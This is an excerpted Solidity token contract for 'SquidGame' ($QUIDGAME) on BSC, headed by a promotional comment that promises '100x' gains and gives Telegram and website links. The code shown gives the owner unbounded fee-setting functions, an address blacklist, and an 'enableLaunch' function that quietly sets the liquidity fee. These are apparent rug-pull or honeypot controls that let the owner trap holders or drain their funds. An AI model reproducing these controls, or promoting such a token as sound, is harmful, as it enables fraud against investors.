...
/*
Welcome to $QUIDGAME ⬛️⚪️🔺

✨Player you are invited to participate in our community @Squid_Game_Bsc where you can win 100x for the potential value of our launch ✨

⬛️5% of transactions will go to the locked liquidity pool for life, 5% of transactions will be redirected to $QUIDGAME holders.
⚪️ Advanced Anti Whales system
🔺 Advanced Anti Dip System
...
🚦 Roadmap: https://squidgamebsc.xyz/#roadmap
🌐 Website: https://squidgamebsc.xyz
💬 Telegram Group: https://t.me/Squid_Game_Bsc
*/
...
contract SquidGame is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Squid Game", "SQUIDGAME") public {
    ...
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        ...
        function set_percentage_rewardsfee(uint256 value) external onlyOwner{
            rewardsFee = value;
        }
        


        function setPercentageMarketingFee(uint256 value) external onlyOwner{
            marketingFee = value;
        }
    ...
    function setMarketingWallet(address payable wallet) external onlyOwner{
        ...
        function setPercentageliquidity(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
    ...
    function blacklistAddress(address account, bool value) external onlyOwner {
        ...
        function enablebuy_fee(uint256 value) external onlyOwner {
            buyFee = value;
        }
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        ...
        function enableLaunch(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
